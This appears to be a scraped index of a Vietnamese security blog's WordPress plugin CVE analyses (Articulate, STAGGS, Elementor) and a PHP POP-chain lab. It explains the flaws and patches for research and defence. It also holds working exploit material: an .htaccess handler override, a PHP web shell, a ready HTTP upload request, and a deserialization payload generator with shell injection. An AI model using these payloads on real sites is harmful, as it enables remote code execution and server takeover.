articulate_has_php_file() adds '.htaccess' check\"]\rP --\u003e Q[\"Upload blocked if .htaccess detected\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php?action=articulate_upload_file\"] --\u003e B[\"articulate_upload_ajax_file()\"]\rB --\u003e C{\"check_ajax_referer('articulate_upload_file') valid?\"}\rC -- No --\u003e Z[\"Return JSON error\"]\rC -- Yes --\u003e D{\"User has 'upload_files' \u0026\u0026 'unfiltered_html'?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"Handle uploaded file → save to {$filePath}.part\"]\rE --\u003e F[\"Combine chunks \u0026 rename → articulate_custom_rename('{$filePath}.part', $filePath)\"]\rF --\u003e G[\"extractZip($filePath, $target, $dir)\"]\rG --\u003e H[\"Quiz_Unzip-\u003eunzip_file($filePath, $target)\"]\rH --\u003e I{\"articulate_has_php_file($target) detect .php/.phtml/.phar ?\"}\rI -- Yes --\u003e J[\"articulate_rrmdir($target) → delete folder → return error\"]\rI -- No --\u003e K[\"(❌ Missing check for .htaccess file)\"]\rK --\u003e L[\"Attacker uploads ZIP containing .htaccess\"]\rL --\u003e M[\".htaccess overrides Apache handler in upload dir\"]\rM --\u003e N[\"Subsequent uploaded files with arbitrary extension (e.g., .abc, .xyz) executed as PHP\"]\rN --\u003e O[\"→ Arbitrary File Upload → Remote Code Execution (RCE)\"]\r%% Patch branch\rK --\u003e P[\"✅ [Patched] articulate_has_php_file() adds '.htaccess' check\"]\rP --\u003e Q[\"Upload blocked if .htaccess detected\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php?action=articulate_upload_file\"] --\u003e B[\"articulate_upload_ajax_file()\"]\rB --\u003e C{\"check_ajax_referer('articulate_upload_file') valid?\"}\rC -- No --\u003e Z[\"Return JSON error\"]\rC -- Yes --\u003e D{\"User has 'upload_files' \u0026\u0026 'unfiltered_html'?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"Handle uploaded file → save to {$filePath}.part\"]\rE --\u003e F[\"Combine chunks \u0026 rename → articulate_custom_rename('{$filePath}.part', $filePath)\"]\rF --\u003e G[\"extractZip($filePath, $target, $dir)\"]\rG --\u003e H[\"Quiz_Unzip-\u003eunzip_file($filePath, $target)\"]\rH --\u003e I{\"articulate_has_php_file($target) detect .php/.phtml/.phar ?\"}\rI -- Yes --\u003e J[\"articulate_rrmdir($target) → delete folder → return error\"]\rI -- No --\u003e K[\"(❌ Missing check for .htaccess file)\"]\rK --\u003e L[\"Attacker uploads ZIP containing .htaccess\"]\rL --\u003e M[\".htaccess overrides Apache handler in upload dir\"]\rM --\u003e N[\"Subsequent uploaded files with arbitrary extension (e.g., .abc, .xyz) executed as PHP\"]\rN --\u003e O[\"→ Arbitrary File Upload → Remote Code Execution (RCE)\"]\r%% Patch branch\rK --\u003e P[\"✅ [Patched] articulate_has_php_file() adds '.htaccess' check\"]\rP --\u003e Q[\"Upload blocked if .htaccess detected\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php?action=articulate_upload_file\"] --\u003e B[\"articulate_upload_ajax_file()\"]\rB --\u003e C{\"check_ajax_referer('articulate_upload_file') valid?\"}\rC -- No --\u003e Z[\"Return JSON error\"]\rC -- Yes --\u003e D{\"User has 'upload_files' \u0026\u0026 'unfiltered_html'?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"Handle uploaded file → save to {$filePath}.part\"]\rE --\u003e F[\"Combine chunks \u0026 rename → articulate_custom_rename('{$filePath}.part', $filePath)\"]\rF --\u003e G[\"extractZip($filePath, $target, $dir)\"]\rG --\u003e H[\"Quiz","date":"2025-11-12","objectID":"/vi/posts/2025-11-12-cve-2025-32202/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/vi/posts/2025-11-12-cve-2025-32202/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rTạo cấu trúc thư mục sau: bypass . ├── .htaccess ├── index.html └── rce.abc .htaccess \u003cIfModule mod_php.c\u003e \u003cFiles \"*.abc\"\u003e SetHandler application/x-httpd-php \u003c/Files\u003e \u003c/IfModule\u003e Tạo rule, có thể upload file .abc trong thư mục hiện tại và thư mục con. Khiến nó thực thi như file .php rce.abc Chứa web shell \u003c?php system($_REQUEST[\"cmd\"]) ?\u003e Nén thư mục lại thành file .zip zip -r bypass.zip bypass Upload file zip vừa tạo Widget của plugin trong tạo post\rThông tin\rĐây là chức năng được môt tả trong document của plugin, ta tạo post rồi thêm widget này sau đó thực hiện upload zip file Widget e-Elearning\rRequest và Response trong BurpSuite: Request và Response trong BurpSuite\rRCE với web shell RCE với file upload\r","date":"2025-11-12","objectID":"/vi/posts/2025-11-12-cve-2025-32202/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/vi/posts/2025-11-12-cve-2025-32202/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-32202 phát sinh do plugin Insert or Embed Articulate Content into WordPress kiểm tra không đầy đủ loại file được giải nén, bỏ sót trường hợp .htaccess. Điều này cho phép attacker có quyền Editor tải lên một file .htaccess để ghi đè cơ chế xử lý file trong thư mục upload. Kết quả là các file được tải lên sau đó, dù có phần mở rộng tùy ý (như .abc, .xyz), vẫn có thể được xử lý như file PHP, dẫn đến Remote Code Execution (RCE). Bản vá 4.3000000026 đã bổ sung kiểm tra đối với .htaccess, ngăn chặn việc ghi đè handler trong thư mục upload và loại bỏ khả năng khai thác này. ","date":"2025-11-12","objectID":"/vi/posts/2025-11-12-cve-2025-32202/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/vi/posts/2025-11-12-cve-2025-32202/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key Takeaway\rCần kiểm tra chặt chẽ mọi loại file có thể ảnh hưởng đến hành vi máy chủ, đặc biệt là .htaccess Không chỉ dựa vào phần mở rộng file; cần xác thực cả MIME type và nội dung thực tế của file. Không nên cho phép người dùng, kể cả tài khoản có quyền Editor, tải lên file nén chứa nội dung có thể thực thi. Cần tách biệt rõ ràng thư mục upload của người dùng khỏi thư mục có thể thực thi PHP. Thường xuyên kiểm tra và cập nhật plugin; các lỗi nhỏ trong cơ chế lọc file có thể dẫn tới RCE nghiêm trọng. ","date":"2025-11-12","objectID":"/vi/posts/2025-11-12-cve-2025-32202/:8:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/vi/posts/2025-11-12-cve-2025-32202/#key-takeaway"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rArbitrary File Upload WordPress Insert or Embed Articulate Content into WordPress Plugin \u003c= 4.3000000025 is vulnerable to Arbitrary File Upload ","date":"2025-11-12","objectID":"/vi/posts/2025-11-12-cve-2025-32202/:9:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/vi/posts/2025-11-12-cve-2025-32202/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress STAGGS Plugin.","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-cve-2025-47637/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/vi/posts/2025-11-11-cve-2025-47637/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rLỗ hổng Arbitrary File Upload trong plugin STAGGS cho phép kẻ tấn công tải lên Web Shell lên máy chủ web, ảnh hưởng đến các phiên bản STAGGS từ n/a đến 2.11.0. CVE ID: CVE-2025-47637 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 2.11.0 Patched Versions: 2.12.0 CVSS severity: High (10) Required Privilege: Unauthenticated Product: WordPress STAGGS Plugin ","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-cve-2025-47637/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/vi/posts/2025-11-11-cve-2025-47637/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - STAGGS: 2.11.0 – vulnerable 2.12.0 – patched Diff Tool (diff) → Meld hoặc bất kỳ công cụ diff nào. ","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-cve-2025-47637/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/vi/posts/2025-11-11-cve-2025-47637/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Cause\rLỗ hổng xảy ra trong hàm store_final_product_image() thuộc file /wp-content/plugins/staggs/includes/staggs-functions.php do không xác thực file type trước khi upload Xác thực file type\rBản vá đã sử dụng while list, chỉ chấp nhận các loại file: png,jpg,jpeg,gif ","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-cve-2025-47637/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/vi/posts/2025-11-11-cve-2025-47637/#cause"},{"categories":["CVE Analyst"],"collections":null,"content":"Code Analysis\rPlugin đã đăng ký một action hook dành cho người dùng chưa đăng nhập (wp_ajax_nopriv_): add_action( 'wp_ajax_nopriv_staggs_get_configuration_form_urls', 'staggs_get_configuration_form_urls_ajax' ); Khi truy cập endpoint /wp-admin/admin-ajax.php với param action=staggs_get_configuration_form_urls thì callback staggs_get_configuration_form_urls_ajax được gọi function staggs_get_configuration_form_urls_ajax() { $response = array(); if ( ! isset( $_POST['nonce'] ) || ! wp_verify_nonce( $_REQUEST['nonce'], 'sgg_ajax_nonce' ) ) { echo json_encode( $response ); die(); } ... if ( isset( $_POST['image_id'] ) ) { $image_name = staggs_sanitize_title( get_the_title( $_POST['image_id'] ) ); // image name based on product title. $image_url = store_final_product_image( $image_name, $_POST['image'], $_POST['values'], true ); $response['image_url'] = $image_url; } ... echo json_encode( $response ); die(); } Hàm này kiểm tra nonce từ request, nếu nó không tồn tại hoặc không hợp lệ thì trả về response rỗng Mẹo Khi tìm kiếm với từ khóa sgg_ajax_nonce, ta thấy nonce được tạo bằng key AJAX_NONCE và có comment // image name based on product title. liên quan đến product. Do phần này không yêu cầu xác thực, có thể đây là cơ chế phục vụ việc hiển thị product cho người dùng chưa đăng nhập, và nonce được chèn trực tiếp vào mã nguồn. Khi thử tính năng tạo product của plugin, hệ thống tạo một post mà người dùng chưa đăng nhập vẫn có thể truy cập. nonce này xuất hiện trong mã nguồn trả về khi truy cập product vừa được tạo. Cách nonce được tạo\rTạo Product bằng plugin\rNonce lấy từ response\rNếu nonce hợp lệ, tiếp tục kiểm tra $_POST['image_id'] có tồn tại hay không, nếu có: Lấy image name tức tên của product title (theo mô tả: // image name based on product title.) Gọi store_final_product_image() để lưu ảnh và lấy URL trả về Trả về phản hồi JSON chứa image_url. function store_final_product_image( $imagename, $data, $options, $main_image = true) { if ( preg_match( '/^data:image\\/(.*);base64,/', $data, $type ) ) { // Valid base64 image. $data = substr( $data, strpos($data, ',') + 1 ); $type = strtolower( $type[1] ); // jpg, png, gif $data = str_replace( ' ', '+', $data ); $data = base64_decode($data); if ( $data === false ) { throw new \\Exception('Image decode failed. Try again.'); } } ... $upload_dir = wp_get_upload_dir(); $base_dir = $upload_dir['basedir']; // Allow different location. $save_path = apply_filters( 'staggs_image_save_dir', $base_dir . '/staggs' ); if ( ! file_exists( $save_path ) ) { mkdir( $save_path, 0777, true ); } if ( $main_image ) { // Main product image. if ( is_array( $options ) \u0026\u0026 count( $options ) \u003e 0 ) { $filename = $imagename . '-' . md5( wp_json_encode( $options ) ) . '.' . $type; } else { $filename = $imagename . '.' . $type; } } ... // Always override in case something went wrong earlier file_put_contents( $save_path . \"/{$filename}\", $data ); $image_path_url = str_replace( ABSPATH, trailingslashit( get_site_url() ), $save_path ); return $image_path_url . \"/{$filename}\"; } Lệnh: preg_match('/^data:image\\/(.*);base64,/', $data, $type) Dùng để kiểm tra xem biến $data có phải là chuỗi ảnh ở định dạng Base64 Data URI hay không. Cụ thể: ^data:image\\/ → chuỗi phải bắt đầu bằng data:image/ (.*) → lấy phần định dạng ảnh (ví dụ: png, jpeg, gif, …) ;base64, → tiếp theo phải có chuỗi ;base64, (báo hiệu dữ liệu ảnh được mã hóa Base64) Nếu khớp, mảng $type sẽ chứa thông tin định dạng ảnh, ví dụ: $type[1] = 'png'; Nếu không khớp, tức $data không phải là dữ liệu ảnh Base64 hợp lệ, hàm trả về 0. Sau đó $type được gán giá trị của $type[1] Lỗi\rTa có thể truyền $data=data:image/php;base64... để $type[1] ='php' if ( is_array( $options ) \u0026\u0026 count( $options ) \u003e 0 ) { $filename = $imagename . '-' . md5( wp_json_encode( $options ) ) . '.' . $type; } else { $filename = $imagename . '.' . $type; } Nếu $options không được truyền thì $filename sẽ có dạng product_title.$type Cuối cùng, file được lưu bằng hàm file_put_contents() và trả về URL đẫn","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-cve-2025-47637/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/vi/posts/2025-11-11-cve-2025-47637/#code-analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rgraph TD\rA[\"POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls\"] --\u003e B[\"staggs_get_configuration_form_urls_ajax()\"]\rB --\u003e C{\"wp_verify_nonce() valid?\"}\rC -- No --\u003e Z[\"Return empty JSON\"]\rC -- Yes --\u003e D{\"isset($_POST['image_id'])?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)\"]\rE --\u003e F{\"preg_match('/^data:image\\/(.*);base64,/', $data, $type) ?\" }\rF -- No --\u003e Z\rF -- Yes --\u003e G[\"$type = strtolower($type[1]); base64_decode($data)\"]\rG --\u003e H[\"file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )\"]\rH --\u003e I[\"Uploaded file (extension from $type) accessible → Arbitrary File Upload / RCE\"]\rgraph TD\rA[\"POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls\"] --\u003e B[\"staggs_get_configuration_form_urls_ajax()\"]\rB --\u003e C{\"wp_verify_nonce() valid?\"}\rC -- No --\u003e Z[\"Return empty JSON\"]\rC -- Yes --\u003e D{\"isset($_POST['image_id'])?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)\"]\rE --\u003e F{\"preg_match('/^data:image\\/(.*);base64,/', $data, $type) ?\" }\rF -- No --\u003e Z\rF -- Yes --\u003e G[\"$type = strtolower($type[1]); base64_decode($data)\"]\rG --\u003e H[\"file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )\"]\rH --\u003e I[\"Uploaded file (extension from $type) accessible → Arbitrary File Upload / RCE\"]\rgraph TD\rA[\"POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls\"] --\u003e B[\"staggs_get_configuration_form_urls_ajax()\"]\rB --\u003e C{\"wp_verify_nonce() valid?\"}\rC -- No --\u003e Z[\"Return empty JSON\"]\rC -- Yes --\u003e D{\"isset($_POST['image_id'])?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)\"]\rE --\u003e F{\"preg_match('/^data:image\\/(.*);base64,/', $data, $type) ?\" }\rF -- No --\u003e Z\rF -- Yes --\u003e G[\"$type = strtolower($type[1]); base64_decode($data)\"]\rG --\u003e H[\"file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )\"]\rH --\u003e I[\"Uploaded file (extension from $type) accessible → Arbitrary File Upload / RCE\"]\rgraph TD\rA[\"POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls\"] --\u003e B[\"staggs_get_configuration_form_urls_ajax()\"]\rB --\u003e C{\"wp_verify_nonce() valid?\"}\rC -- No --\u003e Z[\"Return empty JSON\"]\rC -- Yes --\u003e D{\"isset($_POST['image_id'])?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)\"]\rE --\u003e F{\"preg_match('/^data:image\\/(.*);base64,/', $data, $type) ?\" }\rF -- No --\u003e Z\rF -- Yes --\u003e G[\"$type = strtolower($type[1]); base64_decode($data)\"]\rG --\u003e H[\"file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )\"]\rH --\u003e I[\"Uploaded file (extension from $type) accessible → Arbitrary File Upload / RCE\"]\r","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-cve-2025-47637/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/vi/posts/2025-11-11-cve-2025-47637/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rLấy nonce từ mã nguồn trả về Gửi POST request POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... action=staggs_get_configuration_form_urls\u0026nonce=f281c84283\u0026image_id=1\u0026image=data:image/php;base64,PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg== Với PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg== mã hóa base64 của \u003c?php system($_REQUEST[\"cmd\"]); ?\u003e Request với Web Shell payload\rTruy cập URL trả về và RCE RCE với file upload\r","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-cve-2025-47637/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/vi/posts/2025-11-11-cve-2025-47637/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng cho phép unauthenticated kẻ tấn công tải lên file tùy ý (ví dụ web shell) thông qua endpoint AJAX của plugin STAGGS do thiếu xác thực kiểu file trước khi lưu. Kẻ tấn công có thể lấy nonce từ mã nguồn công khai, gửi data: URI giả mạo (vd. data:image/php;base64,...) và tạo file PHP trên máy chủ, dẫn tới RCE. Vấn đề đã được khắc phục trong phiên bản 2.12.0 bằng cách giới hạn phần mở rộng được chấp nhận (png, jpg, jpeg, gif). ","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-cve-2025-47637/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/vi/posts/2025-11-11-cve-2025-47637/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key Takeaway\rLỗ hổng bắt nguồn từ không kiểm tra hợp lệ kiểu/đuôi file trước khi lưu; kiểm tra client-side/regex không đủ nếu không ràng buộc phần mở rộng và nội dung thực tế. Không để endpoint quan trọng cho phép hành động upload chạy ở chế độ nopriv (unauthenticated) nếu không có cơ chế xác thực và hạn chế chặt. nonce chèn trong mã nguồn có thể bị thu thập và tái sử dụng — không dựa chỉ vào nonce hiển thị công khai để ngăn thao tác nhạy cảm. Cần validate cả MIME type, phần mở rộng, và (nếu có thể) kiểm tra nội dung thực tế của file trên server; lưu file upload ở vị trí không thể thực thi hoặc chuyển đổi thành non-executable. Cập nhật plugin lên \u003e= 2.12.0 ngay lập tức; kiểm tra site cho các file khả nghi trong thư mục upload staggs/ nếu site chạy phiên bản cũ. ","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-cve-2025-47637/:8:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/vi/posts/2025-11-11-cve-2025-47637/#key-takeaway"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rArbitrary File Upload WordPress STAGGS Plugin \u003c= 2.11.0 is vulnerable to Arbitrary File Upload ","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-cve-2025-47637/:9:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/vi/posts/2025-11-11-cve-2025-47637/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Explore the POP Chain in a PHP lab: identify gadgets, craft a payload, and successfully achieve RCE.","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-pop-chain-lab1/","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/vi/posts/2025-11-11-pop-chain-lab1/"},{"categories":["CVE Analyst"],"collections":null,"content":"Intro\rTrong quá trình nghiên cứu Insecure Deserialization, mình nhận được một lab liên quan đến POP Chain (Property-Oriented Programming Chain). Đây là một dạng tấn công thú vị: thay vì khai thác hàm hay lệnh trực tiếp, kẻ tấn công kết hợp các gadget (các phương thức magic của class) để đạt được mục tiêu — ví dụ thực thi lệnh hệ thống (RCE). Bài viết này mô tả quá trình mình phân tích và khai thác lab: từ xem qua mã nguồn, nhận diện các gadget hữu dụng, tới cách xây payload để kích hoạt chuỗi gọi (POP chain). Mục tiêu là giúp bạn hiểu được phương pháp tư duy khi xử lý lab kiểu này. Lab mình thực hiện: https://github.com/William957-web/POP-CHAIN-LAB1/blob/main/index.php ","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-pop-chain-lab1/:1:0","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/vi/posts/2025-11-11-pop-chain-lab1/#intro"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-pop-chain-lab1/:2:0","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/vi/posts/2025-11-11-pop-chain-lab1/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Tổng quan mã nguồn\r\u003c?php class User{ public $name; private $memo; function __construct($name){ $this-\u003ename=$name; } function __wakeup(){ $this-\u003ememo=new Note($this -\u003e name.\"say hello\", 'test_whale'); } function __get($content){ return $this-\u003ememo; } } class Note{ public $content; public $whale; function __construct($content, $whale){ $this-\u003econtent=$content; $this-\u003ewhale=$whale; } function __toString(){ $this-\u003erecord($this-\u003ewhale, $this-\u003econtent); return 'Record for '.$this-\u003ewhale.' is : '.$this-\u003econtent; } function record($whale, $content){ //check whether it's an attribute $test=$whale-\u003e$content; if ($test!=NULL){ echo(\"It's probably an attribute\"); } } } class Whale{ public $name; private $note; function __construct($name){ $this-\u003ename=$name; } function take_note($note){ $this-\u003enote=date(\"Y/m/d H:i:s\").$note; } function __get($attribute){ system('echo \"'.$this-\u003ename.'\" \u003e\u003e log.txt'); return $this-\u003e$attribute; } function __toString(){ return $this-\u003ename; } } if (isset($_POST['pop'])){ unserialize(base64_decode($_POST['pop'])); } ?\u003e File chính có ba class quan trọng: User, Note, Whale. Cuối file có dòng unserialize đầu vào nếu $_POST['pop'] được gửi: if (isset($_POST['pop'])){ unserialize(base64_decode($_POST['pop'])); } Những điểm đáng chú ý: Dòng 8: User::__wakeup() tạo một Note và gán vào $this-\u003ememo. Dòng 23: Note::__toString() gọi record() rồi trả về một chuỗi. Dòng 28: Note::record() truy xuất $whale-\u003e$content. Dòng 44: Whale::__get() gọi system('echo \"'.$this-\u003ename.'\" \u003e\u003e log.txt');. Dòng 52: vị trí gọi unserialize(...) — điểm tấn công. ","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-pop-chain-lab1/:2:1","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/vi/posts/2025-11-11-pop-chain-lab1/#tổng-quan-mã-nguồn"},{"categories":["CVE Analyst"],"collections":null,"content":"Luồng thực thi dẫn đến shell\rUnserialize một User: Khi unserialize một object User, magic method __wakeup() sẽ chạy. Ở đây __wakeup() khởi tạo một Note mới bằng cách lấy $this-\u003ename . \"say hello\" làm content và 'test_whale' làm whale: $this-\u003ememo = new Note($this-\u003ename . \"say hello\", 'test_whale'); Note::__toString() sẽ gọi record(): __toString() trong Note gọi record($this-\u003ewhale, $this-\u003econtent) trước khi trả về chuỗi. __toString() được gọi khi đối tượng bị ép sang chuỗi. Ta lợi dụng $this-\u003ename làm đối tượng của note sẽ bị ép sang chuỗi khi concat \"say hello\" ở dòng 9. record() truy xuất thuộc tính động trên $whale: Trong record() có dòng: $test = $whale-\u003e$content; Nếu $whale là một object Whale và $content không khớp thuộc tính tồn tại, PHP sẽ gọi magic Whale::__get($attribute). Whale::__get() thực thi system(): __get() của Whale chứa: system('echo \"'.$this-\u003ename.'\" \u003e\u003e log.txt'); Vì system() chạy shell, nếu $this-\u003ename chứa ký tự phá vỡ lệnh (ví dụ \"; ls /; echo \"), attacker có thể chèn và thực thi lệnh shell dẫn tới RCE. ","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-pop-chain-lab1/:2:2","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/vi/posts/2025-11-11-pop-chain-lab1/#luồng-thực-thi-dẫn-đến-shell"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\rTạo 1 file tương tự file gốc nhưng chứa code tạo serialize: \u003c?php class User{ public $name; private $memo; function __construct(){ $this-\u003ename= new Note(\"Top2\",new Whale(('\"; ls /; echo \"'))); } function __wakeup(){ $this-\u003ememo=new Note($this -\u003e name.\"say hello\", 'test_whale'); } function __get($content){ return $this-\u003ememo; } } class Note{ public $content; public $whale; function __construct($content, $whale){ $this-\u003econtent=$content; $this-\u003ewhale=$whale; } function __toString(){ $this-\u003erecord($this-\u003ewhale, $this-\u003econtent); return 'Record for '.$this-\u003ewhale.' is : '.$this-\u003econtent; } function record($whale, $content){ //check whether it's an attribute $test=$whale-\u003e$content; if ($test!=NULL){ echo(\"It's probably an attribute\"); } } } class Whale{ public $name; private $note; function __construct($name){ $this-\u003ename=$name; } function take_note($note){ $this-\u003enote=date(\"Y/m/d H:i:s\").$note; } function __get($attribute){ system('echo \"'.$this-\u003ename.'\" \u003e\u003e log.txt'); return $this-\u003e$attribute; } function __toString(){ return $this-\u003ename; } } $u = new User(); $searialize = serialize($u); echo base64_encode(''. $searialize .''); ?\u003e Chạy file này và copy chuỗi base64 trả về: Chuỗi base64 trả về\rGửi request theo cú pháp challenge RCE thành công\r","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-pop-chain-lab1/:3:0","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/vi/posts/2025-11-11-pop-chain-lab1/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Elementor Website Builder Plugin.","date":"2025-11-10","objectID":"/vi/posts/2025-11-10-cve-2023-48777/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/vi/posts/2025-11-10-cve-2023-48777/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rLỗ hổng Arbitrary File Upload trong Elementor Website Builder plugin cho WordPress. Vấn đề này ảnh hưởng đến Elementor Website Builder: từ phiên bản 3.3.0 đến 3.18.1. CVE ID: CVE-2023-48777 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 3.3.0-3.18.1 Patched Versions: 3.18.2 CVSS severity: High (9.9) Required Privilege: Contributor Product: WordPress Elementor Website Builder Plugin ","date":"2025-11-10","objectID":"/vi/posts/2025-11-10-cve-2023-48777/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/vi/posts/2025-11-10-cve-2023-48777/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Elementor Website Builder: 3.3.0 – vulnerable 3.18.2 – patched Diff Tool (diff) → Meld hoặc bất kỳ công cụ diff nào. ","date":"2025-11-10","objectID":"/vi/posts/2025-11-10-cve-2023-48777/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/vi/posts/2025-11-10-cve-2023-48777/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Cause\rLỗ hổng xuất phát từ việc không kiểm tra loại file (file type) hợp lệ trước khi lưu trữ lên server, cho phép kẻ tấn công tải lên các file có định dạng nguy hiểm. Trong phiên bản 3.18.1, hàm handle_elementor_upload() không thực hiện xác minh file type khi xử lý dữ liệu tải lên từ tham số fileData: public function handle_elementor_upload( array $file, $allowed_file_extensions = null ) { if ( isset( $file['fileData'] ) ) { $file = $this-\u003esave_base64_to_tmp_file( $file ); } $validation_result = $this-\u003evalidate_file( $file, $allowed_file_extensions ); if ( is_wp_error( $validation_result ) ) { return $validation_result; } return $file; } private function save_base64_to_tmp_file( $file ) { $file_content = base64_decode( $file['fileData'] ); // phpcs:ignore // If the decode fails if ( ! $file_content ) { return new \\WP_Error( 'file_error', self::INVALID_FILE_CONTENT ); } $temp_filename = $this-\u003ecreate_temp_file( $file_content, $file['fileName'] ); if ( is_wp_error( $temp_filename ) ) { return $temp_filename; } return [ // the original uploaded file name 'name' =\u003e $file['fileName'], // The path to the temporary file 'tmp_name' =\u003e $temp_filename, ]; } Trong bản vá 3.18.2, nhà phát triển đã bổ sung kiểm tra loại file hợp lệ trước khi lưu trữ bằng cách truyền thêm tham số $allowed_file_extensions vào hàm save_base64_to_tmp_file(), nhằm ngăn chặn việc tải lên các file độc hại: public function handle_elementor_upload( array $file, $allowed_file_extensions = null ) { if ( isset( $file['fileData'] ) ) { $file = $this-\u003esave_base64_to_tmp_file( $file, 